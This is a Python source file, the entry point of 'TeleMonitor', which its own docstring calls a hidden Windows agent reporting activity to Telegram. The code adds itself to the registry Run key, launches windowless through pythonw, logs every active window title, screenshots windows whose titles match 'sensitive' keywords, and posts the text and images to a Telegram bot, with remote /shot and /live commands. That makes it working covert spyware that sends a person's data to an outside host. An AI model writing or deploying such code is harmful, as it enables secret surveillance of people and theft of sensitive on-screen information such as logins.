"""TeleMonitor entry point: hidden Windows agent reporting activity to Telegram."""
from __future__ import annotations

import ctypes
import logging
import logging.handlers
import os
import queue
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

import capture
import commands
import config
import telegram
import tracker
import wininfo

APP_NAME = "TeleMonitor"
MUTEX_NAME = "Local\\TeleMonitorMutex"
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
LOG_DIR = Path(os.environ.get("LOCALAPPDATA", str(Path.home()))) / APP_NAME
ERROR_ALREADY_EXISTS = 183

log = logging.getLogger(APP_NAME)
_mutex_handle = None


def setup_logging() -> None:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    handler = logging.handlers.RotatingFileHandler(
        LOG_DIR / "app.log", maxBytes=1_000_000, backupCount=3, encoding="utf-8"
    )
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    if not root.handlers:
        root.addHandler(handler)
        if sys.stderr is not None:
            root.addHandler(logging.StreamHandler())


def say(msg: str, error: bool = False, box: bool = False) -> None:
    """Log (which streams to a console when one is attached); box only on request.

    A MessageBox would block install.bat / uninstall.bat waiting for a click,
    so only --test (a user-initiated, interactive command) passes box=True.
    """
    (log.error if error else log.info)("%s", msg)
    if box and getattr(sys, "frozen", False) and not os.environ.get("TELEMONITOR_NOBOX"):
        ctypes.windll.user32.MessageBoxW(None, msg, APP_NAME, 0x10 if error else 0x40)


def acquire_single_instance() -> bool:
    global _mutex_handle
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.CreateMutexW.restype = ctypes.c_void_p
    _mutex_handle = kernel32.CreateMutexW(None, False, MUTEX_NAME)
    return ctypes.get_last_error() != ERROR_ALREADY_EXISTS


def autostart_command() -> str:
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}"'
    pythonw = Path(sys.executable).with_name("pythonw.exe")
    launcher = pythonw if pythonw.exists() else Path(sys.executable)
    return f'"{launcher}" "{Path(__file__).resolve()}"'


def install_autostart() -> None:
    import winreg

    cmd = autostart_command()
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
    say(f"Đã bật tự khởi động:\n{cmd}")


def uninstall_autostart() -> None:
    import winreg

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, APP_NAME)
        say("Đã tắt tự khởi động.")
    except FileNotFoundError:
        say("Chưa có mục tự khởi động nào.")


class Sender:
    """Background thread that drains a bounded queue and posts to Telegram."""

    def __init__(self, cfg: dict) -> None:
        self.token = cfg["bot_token"]
        self.chat_id = cfg["chat_id"]
        self.q: queue.Queue = queue.Queue(maxsize=100)
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def put(self, kind: str, payload) -> None:
        try:
            self.q.put_nowait((kind, payload))
        except queue.Full:
            log.warning("send queue full, dropping oldest")
            try:
                self.q.get_nowait()
                self.q.put_nowait((kind, payload))
            except (queue.Empty, queue.Full):
                pass

    def _run(self) -> None:
        if not self.token or not self.chat_id:
            return
        while True:
            kind, payload = self.q.get()
            for attempt in range(3):
                try:
                    if kind == "text":
                        telegram.send_message(self.token, self.chat_id, payload)
                    else:
                        telegram.send_photo(
                            self.token, self.chat_id, payload[0], payload[1]
                        )
                    break
                except telegram.TelegramError as exc:
                    log.warning("send failed (try %d): %s", attempt + 1, exc)
                    time.sleep(5 * (attempt + 1))


def poll_forever(cfg: dict, sender: Sender) -> None:
    changes = tracker.ChangeTracker()
    ignore = {str(a).lower() for a in cfg["ignore_apps"]}
    device = telegram.escape(cfg["device_name"])
    last_shot = 0.0

    while True:
        try:
            app, title = wininfo.active()
            skip = not app or app.lower() in ignore

            if not skip and cfg["track_activity"] and changes.changed(app, title):
                sender.put(
                    "text",
                    f"[{device}] <b>{telegram.escape(app)}</b>\n"
                    f"— {telegram.escape(title) or '(không có tiêu đề)'}",
                )

            if not skip and capture.is_sensitive(title, cfg["sensitive_keywords"]):
                now = time.monotonic()
                if now - last_shot >= cfg["sensitive_cooldown"]:
                    last_shot = now
                    try:
                        jpeg = capture.grab_jpeg()
                        caption = f"⚠️ [{device}] {telegram.escape(title)[:200]}"
                        sender.put("photo", (jpeg, caption))
                    except Exception as exc:  # noqa: BLE001 - capture must never kill the loop
                        log.warning("screenshot failed: %s", exc)
        except Exception:  # noqa: BLE001 - keep the agent alive
            log.exception("poll error")
        time.sleep(cfg["poll_interval"])


def run() -> None:
    cfg = config.load()
    if not cfg["bot_token"] or not cfg["chat_id"]:
        log.error("Thiếu bot_token/chat_id trong %s", config.config_path())
        return
    log.info("start device=%s interval=%s", cfg["device_name"], cfg["poll_interval"])
    sender = Sender(cfg)
    sender.start()
    if cfg["enable_commands"]:
        commands.CommandListener(cfg, sender, commands.LiveSession()).start()
        log.info("command listener enabled (/shot, /live, /stop, /status)")
    if cfg["send_startup_message"]:
        stamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        sender.put(
            "text",
            f"🟢 <b>Máy tính đã bật</b>\n"
            f"🖥️ <b>{telegram.escape(cfg['device_name'])}</b>\n"
            f"🕒 {stamp}",
        )
    poll_forever(cfg, sender)


def test_send() -> int:
    cfg = config.load()
    if not cfg["bot_token"] or not cfg["chat_id"]:
        say(f"Thiếu bot_token/chat_id trong {config.config_path()}", error=True, box=True)
        return 1
    try:
        telegram.send_message(
            cfg["bot_token"],
            cfg["chat_id"],
            f"✅ Test từ <b>{telegram.escape(cfg['device_name'])}</b>",
        )
    except telegram.TelegramError as exc:
        say(f"Gửi thất bại: {exc}", error=True, box=True)
        return 1
    say("Đã gửi tin test. Kiểm tra Telegram.", box=True)
    return 0


def main(argv: list[str] | None = None) -> int:
    args = sys.argv[1:] if argv is None else argv
    setup_logging()
    if "--install" in args:
        install_autostart()
        return 0
    if "--uninstall" in args:
        uninstall_autostart()
        return 0
    if "--test" in args:
        return test_send()
    if not acquire_single_instance():
        log.info("another instance is already running, exiting")
        return 0
    run()
    return 0


if __name__ == "__main__":
    sys.exit(main())
